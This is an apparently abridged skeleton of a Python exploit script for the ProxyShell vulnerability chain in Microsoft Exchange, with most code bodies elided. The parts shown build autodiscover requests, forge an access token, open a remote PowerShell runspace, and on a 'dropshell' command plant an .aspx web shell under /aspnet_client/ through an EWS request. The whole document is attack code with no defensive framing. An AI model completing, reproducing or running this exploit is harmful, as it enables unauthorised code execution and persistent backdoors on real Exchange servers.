...
class ProxyShell:
    ...
    def autodiscover_body(self):
        ...
        ET.SubElement(request, "AcceptableResponseSchema").text = (
    ...
    def gen_token(self):
        ...
        version_data = (
            b"V" + (1).to_bytes(1, "little") + (version).to_bytes(1, "little")
        )
...
def shell(command, port, proxyshell):
    ...
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        ...
        if command.lower().strip() == "dropshell":
            ...
            ).add_parameter("User", proxyshell.email)
            output = ps.invoke()
            ...
            shell_url = (
                f"{proxyshell.exchange_url}/aspnet_client/{proxyshell.rand_subj}.aspx"
            )
...
def drop_shell(proxyshell):
  ...
  <soap:Body>
    ...
    r = proxyshell.post(
        f"/EWS/exchange.asmx/?X-Rps-CAT={proxyshell.token}", data=data, headers=headers
    )
